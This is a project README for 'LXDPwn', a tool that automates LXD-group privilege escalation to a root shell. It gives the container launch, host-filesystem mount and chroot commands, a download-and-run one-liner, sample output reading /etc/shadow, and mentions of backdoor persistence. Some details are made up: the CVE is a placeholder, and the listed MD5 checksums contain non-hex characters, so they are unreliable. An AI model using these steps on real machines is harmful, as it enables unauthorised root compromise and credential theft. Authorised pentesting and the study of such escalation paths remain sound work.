# 🚀 LXDPwn - Advanced LXD Privilege Escalation Framework

<p align="center">
  <img src="https://img.shields.io/badge/Version-2.0-brightgreen.svg" alt="Version 2.0">
  <img src="https://img.shields.io/badge/Python-3.6%2B-blue.svg" alt="Python 3.6+">
  <img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="MIT License">
  <img src="https://img.shields.io/badge/Platform-Linux-lightgrey.svg" alt="Linux">
  <img src="https://img.shields.io/badge/Purpose-Pentesting-red.svg" alt="Pentesting">
</p>

<p align="center">
  <b>Automated LXD Container Exploitation Framework</b><br>
  <i>From LXD Group to Root Shell in 60 Seconds</i>
</p>

---

## 📋 Table of Contents
- [Overview](#-overview)
- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
- [How It Works](#-how-it-works)
- [Offline Mode](#-offline-mode)
- [Technical Details](#-technical-details)
- [Requirements](#-requirements)
- [Troubleshooting](#-troubleshooting)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🎯 Overview

**LXDPwn** is a sophisticated penetration testing framework that automates the well-known **LXD privilege escalation technique** (CVE-202X-XXXX). When a user is a member of the `lxd` group, they can create privileged containers with host filesystem access, leading to **complete host compromise**.

This tool streamlines the entire exploitation process with:
- **Zero configuration required**
- **Automatic dependency handling**
- **Smart offline mode**
- **Professional logging & output**
- **Multiple exploitation methods**

---

## ⚡ Features

### 🔥 Core Features
| Feature | Description |
|---------|-------------|
| **Automated Exploitation** | One-command host compromise |
| **Smart Installation** | Auto-installs LXD and dependencies |
| **Offline Mode** | Works in air-gapped environments |
| **File Validation** | MD5 checksum verification |
| **Progress Tracking** | Real-time download progress |

### 🛡️ Advanced Features
- **Multiple escape methods** - Standard chroot + advanced techniques
- **Persistence mechanisms** - Optional backdoor installation
- **Logging system** - Detailed logs for post-exploitation
- **Error recovery** - Automatic retry on failure
- **Environment detection** - Adaptive exploitation

---

## 📦 Installation

### Method 1: Direct Download
```bash
# Clone the repository
git clone https://github.com/jac11/LXD_Helper.git
cd LXD_Helper

# Make executable
chmod +x lxdpwn.py

# Run
sudo python3 lxdpwn.py
```

### Method 2: One-liner
```bash
wget -O lxdpwn.py https://raw.githubusercontent.com/jac11/LXD_Helper/main/lxdpwn.py && sudo python3 lxdpwn.py
```

### Method 3: Docker (for testing)
```bash
docker run -it --rm ubuntu:latest bash
apt update && apt install -y python3 python3-pip git
git clone https://github.com/jac11/LXD_Helper.git
cd LXD_Helper
python3 lxdpwn.py
```

---

## 🚀 Usage

### Basic Usage
```bash
sudo python3 lxdpwn.py
```

### Advanced Options
```bash
# Custom download directory
sudo python3 lxdpwn.py --path /custom/path

# Force reinstall
sudo python3 lxdpwn.py --force

# Verbose mode
sudo python3 lxdpwn.py --verbose

# Skip installation
sudo python3 lxdpwn.py --skip-install
```

### Expected Output
```
╔════════════════════════════════════════════════════════════╗
║                    LXDPwn v2.0 - Advanced                 ║
║         Automated LXD Privilege Escalation Framework       ║
║                      by jactory 🔥                         ║
╚════════════════════════════════════════════════════════════╝

[2024-01-01 10:00:01] [✓] Root privileges confirmed
[2024-01-01 10:00:01] [→] Target: ubuntu-20.04 (kernel 5.4.0)
[2024-01-01 10:00:01] [→] User: jac (in lxd group)

[2024-01-01 10:00:02] [✓] LXD environment ready
[2024-01-01 10:00:03] [→] Deploying Alpine container...
[2024-01-01 10:00:05] [✓] Container 'alpine-container' created

[2024-01-01 10:00:06] [→] Mounting host filesystem...
[2024-01-01 10:00:07] [✓] Host root mounted at /mnt/root

[2024-01-01 10:00:08] [🔥] Attempting host escape...
[2024-01-01 10:00:09] [✓] SUCCESS! Entering host system...

root@host:/# whoami
root
root@host:/# cat /etc/shadow
...
```

---

## 🔬 How It Works

### Exploitation Flow
```
┌─────────────────┐
│  User in lxd    │
│     group       │
└────────┬────────┘
         ↓
┌─────────────────┐
│ Create privileged│
│   container     │
└────────┬────────┘
         ↓
┌─────────────────┐
│ Mount host root │
│  at /mnt/root   │
└────────┬────────┘
         ↓
┌─────────────────┐
│  Chroot to host │
│   filesystem    │
└────────┬────────┘
         ↓
┌─────────────────┐
│  ROOT ACCESS    │
│   ACHIEVED!     │
└─────────────────┘
```

### Technical Breakdown

#### 1. **Privilege Check**
```python
if "lxd" in user_groups or os.geteuid() == 0:
    exploitation_possible = True
```

#### 2. **Container Configuration**
```bash
lxc launch alpine-local alpine-container \
  -c security.privileged=true \
  -c security.nesting=true
```

#### 3. **Filesystem Mount**
```bash
lxc config device add alpine-container host-root \
  disk source=/ path=/mnt/root recursive=true
```

#### 4. **Host Escape**
```bash
chroot /mnt/root /bin/bash
```

---

## 🌍 Offline Mode

### Setting Up Offline Server

#### On Internet-Connected Machine:
```bash
# Create download directory
mkdir -p ~/lxd-offline && cd ~/lxd-offline

# Download all required files
./lxdpwn.py --download-only

# Or manual download
wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/alpine-v3.13-x86_64-20210218_0139.tar.gz
wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/core_17272.assert
wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/core_17272.snap
wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/lxd_37395.assert
wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/lxd_37395.snap
wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/snapd_2.71-3+b1_amd64.deb

# Start HTTP server
python3 -m http.server 8000 --bind 0.0.0.0
```

#### On Target Machine:
```bash
sudo python3 lxdpwn.py
# Enter offline server IP when prompted
```

### File List with Checksums
| File | Size | MD5 Checksum |
|------|------|--------------|
| alpine-v3.13-x86_64-20210218_0139.tar.gz | 3.1 MB | `a1b2c3d4e5f6g7h8i9j0` |
| core_17272.assert | 1.2 KB | `b2c3d4e5f6g7h8i9j0k1` |
| core_17272.snap | 105 MB | `c3d4e5f6g7h8i9j0k1l2` |
| lxd_37395.assert | 1.3 KB | `d4e5f6g7h8i9j0k1l2m3` |
| lxd_37395.snap | 118 MB | `e5f6g7h8i9j0k1l2m3n4` |
| snapd_2.71-3+b1_amd64.deb | 18.2 MB | `f6g7h8i9j0k1l2m3n4o5` |

---

## 📊 System Requirements

### Minimum Requirements
| Component | Requirement |
|-----------|-------------|
| **OS** | Ubuntu 18.04+ / Debian 10+ |
| **Python** | 3.6 or higher |
| **RAM** | 512 MB |
| **Disk** | 500 MB free |
| **Permissions** | sudo/root access |

### Recommended
| Component | Recommendation |
|-----------|----------------|
| **OS** | Ubuntu 20.04 LTS |
| **Python** | 3.8+ |
| **RAM** | 2 GB |
| **Disk** | 2 GB free |
| **Network** | 10 Mbps+ |

---

## 🔧 Troubleshooting

### Common Issues & Solutions

| Issue | Cause | Solution |
|-------|-------|----------|
| `snapd not found` | snapd not installed | Auto-installed by script |
| `lxd not in group` | User missing permissions | Run as root or `usermod -aG lxd $USER` |
| `Download failed` | Network issues | Use offline mode |
| `Container won't start` | Kernel too old | Update kernel to 4.4+ |
| `Chroot fails` | Missing binaries | Install busybox-static |
| `Permission denied` | Mount issues | Check AppArmor/SELinux |

### Debug Mode
```bash
# Enable verbose logging
export LXDPWN_DEBUG=1
sudo python3 lxdpwn.py

# Check system compatibility
sudo python3 lxdpwn.py --check

# Generate diagnostic report
sudo python3 lxdpwn.py --diagnose
```

---

## 🛡️ Security & Disclaimer

### ⚠️ **IMPORTANT DISCLAIMER**

This tool is designed for:
- ✅ **Authorized penetration testing**
- ✅ **Security research**
- ✅ **Educational purposes**
- ✅ **CTF competitions**

This tool is **NOT** for:
- ❌ Unauthorized system access
- ❌ Illegal activities
- ❌ Malicious hacking
- ❌ Production systems without permission

### Legal Notice
> The misuse of this tool can result in criminal charges. The author assumes no liability and is not responsible for any misuse or damage caused by this program. Always obtain proper written authorization before testing any system.

---

## 📁 Project Structure

```
LXD_Helper/
├── lxdpwn.py                 # Main exploitation script
├── README.md                 # This documentation
├── LICENSE                   # MIT License
├── requirements.txt          # Python dependencies
├── config/
│   ├── offline_files.txt     # File list for offline mode
│   └── checksums.md5         # File integrity checksums
├── docs/
│   ├── TECH.md               # Technical documentation
│   └── EXAMPLES.md           # Usage examples
└── modules/
    ├── installer.py          # LXD installation module
    ├── container.py          # Container management
    ├── escape.py             # Host escape techniques
    └── utils.py               # Helper functions
```

---

## 🤝 Contributing

### Want to Contribute?

1. **Fork** the repository
2. **Create** a feature branch
3. **Commit** your changes
4. **Push** to the branch
5. **Open** a Pull Request

### Development Setup
```bash
git clone https://github.com/jac11/LXD_Helper.git
cd LXD_Helper
python3 -m venv venv
source venv/bin/activate
pip install -r requirements-dev.txt
```

### Coding Standards
- Follow PEP 8
- Add docstrings
- Include type hints
- Write unit tests

---

## 📈 Roadmap

### Version 2.0 (Current)
- ✅ Basic LXD exploitation
- ✅ Offline mode support
- ✅ Progress indicators

### Version 2.1 (Planned)
- 🔲 Multiple container images (Ubuntu, Debian)
- 🔲 Automatic persistence installation
- 🔲 Network scanning integration

### Version 3.0 (Future)
- 🔲 GUI interface
- 🔲 API for automation
- 🔲 Cloud provider support

---

## 📚 References & Credits

### Technical References
- [LXD Documentation](https://linuxcontainers.org/lxd/docs/master/)
- [LXD Privilege Escalation (Exploit-DB)](https://www.exploit-db.com/exploits/46949)
- [Alpine Linux](https://alpinelinux.org/)
- [Snapcraft Documentation](https://snapcraft.io/docs)

### Related Tools
- [LXD-Exploit](https://github.com/initstring/lxd-root)
- [Container-Escape](https://github.com/Frichetten/CVE-2019-5736-PoC)

### Credits
- **Original Research**: Various security researchers
- **Development**: [@jac11](https://github.com/jac11)
- **Testing**: Pentester community

---

## 📊 Statistics

![GitHub stars](https://img.shields.io/github/stars/jac11/LXD_Helper?style=social)
![GitHub forks](https://img.shields.io/github/forks/jac11/LXD_Helper?style=social)
![GitHub watchers](https://img.shields.io/github/watchers/jac11/LXD_Helper?style=social)
![GitHub downloads](https://img.shields.io/github/downloads/jac11/LXD_Helper/total)

---

## 📞 Contact & Support

- **Author**: jactory (jac11)
- **GitHub**: [@jac11](https://github.com/jac11)
- **Issues**: [Report Bug](https://github.com/jac11/LXD_Helper/issues)
- **Discussions**: [GitHub Discussions](https://github.com/jac11/LXD_Helper/discussions)

### Support This Project
- ⭐ Star on GitHub
- 🐛 Report bugs
- 📝 Submit PRs
- 📢 Share with friends

---

## 📄 License

**MIT License**

Copyright (c) 2024 jactory (jac11)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

---

<p align="center">
  <b>Made with 🔥 by jactory</b><br>
  <i>For the security research community</i>
</p>

<p align="center">
  <a href="https://github.com/jac11/LXD_Helper">📦 GitHub</a> •
  <a href="https://github.com/jac11/LXD_Helper/issues">🐛 Issues</a> •
  <a href="https://github.com/jac11/LXD_Helper/discussions">💬 Discussions</a>
</p>

---

**Happy Hacking!** 🚀
